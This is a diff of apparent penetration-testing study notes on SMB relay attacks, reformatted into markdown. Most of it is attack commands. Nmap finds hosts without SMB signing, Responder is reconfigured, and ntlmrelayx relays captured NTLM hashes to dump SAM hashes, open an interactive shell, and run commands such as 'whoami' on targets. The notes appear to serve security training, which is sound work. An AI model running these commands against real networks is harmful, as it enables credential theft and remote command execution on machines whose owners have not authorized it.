@@ -1,56 +1,52 @@
 # SMB Relay
 
-What is SMB Relay: Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access
+Instead of cracking hashes gathered with Responder, relay them to other machines for direct access.
 
-Requirements
+## Requirements
 
-SMB signing must be disabled or not enforced on the target
+1. SMB signing must be disabled or not enforced on target
+2. Relayed user credentials must be admin on the target machine
 
-relayed user credentials must be admin on machine for any real value
+## Identifying Targets
 
+Scan for SMB signing status:
 
+```bash
+# Single host
+nmap --script=smb2-security-mode.nse -p445 TARGET_IP
 
-nmap --script=smb2-security-mode.nse -p445 ipaddress /can scan entire network
+# Entire network
+nmap --script=smb2-security-mode.nse -p445 172.16.50.0/24 -Pn
+```
 
+Can also use Nessus for this.
 
+## Setting Up the Attack
 
-nmap --script=smb2-security-mode.nse -p445 192.168.117.0/24 -Pn
+### 1. Configure Responder
 
-can use nessus
-
-
-
-edit responder
-
-
-
+```bash
 sudo mousepad /etc/responder/Responder.conf
+```
 
-turn them off SMB and HTTP
+Turn OFF both SMB and HTTP.
 
+### 2. Run ntlmrelayx
 
+Basic relay (dumps SAM hashes):
 
+```bash
 ntlmrelayx.py -tf targets.txt -smb2support
+```
 
+Interactive shell:
 
-
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
-
-get terminal access
-
+```bash
 ntlmrelayx.py -tf targets.txt -smb2support -i
+```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+Execute commands:
 
-Can also execute commands through this
-
-
-
-ntlmrelayx.py -tf targets.txt -smb2support -c "command"
-
-
-
-
-
-
-
+```bash
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
+```
